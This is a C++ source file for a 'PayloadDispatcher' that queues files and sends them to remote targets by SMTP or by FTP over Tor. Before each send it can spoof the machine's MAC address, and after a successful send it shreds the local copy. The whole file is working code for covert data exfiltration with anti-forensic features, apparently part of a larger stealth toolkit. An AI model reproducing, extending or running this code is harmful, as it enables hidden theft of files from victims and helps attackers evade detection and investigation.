#include "PayloadDispatcher.h"
#include "StealthMailer.h"
#include "FileUploader.h"
#include "MacSpoofer.h"
#include "SecureDeletion.h"
#include <deque>
#include <iostream>

namespace PayloadDispatcher {

    static std::deque<PayloadJob> jobQueue;

    void queue_payload(const PayloadJob& job) {
        jobQueue.push_back(job);
    }

    void dispatch_all(bool useTor, bool spoofMac, bool shredAfter) {
        while (!jobQueue.empty()) {
            auto job = jobQueue.front();
            jobQueue.pop_front();

            if (spoofMac) {
                MacSpoofer::spoof_mac_random();
            }

            bool success = false;

            if (job.method == "smtp") {
                StealthMailer::MailerConfig cfg;
                cfg.payloadPath = job.filePath;
                cfg.smtpServer = job.target;
                cfg.smtpUser = job.user;
                cfg.smtpPassword = job.password;
                cfg.toAddress = job.remoteName;
                cfg.useTor = useTor;
                cfg.requireVPN = false;
                cfg.spoofMac = false;
                cfg.shredAfterSend = shredAfter;
                success = StealthMailer::send_payload_securely(cfg);
            }

            if (job.method == "ftp") {
                success = FileUploader::send_via_ftp_tor(
                    job.filePath, job.target, job.user, job.password, job.remoteName
                );
            }

            if (success && shredAfter) {
                SecureDeletion::shred_file(job.filePath);
            }
        }
    }

}
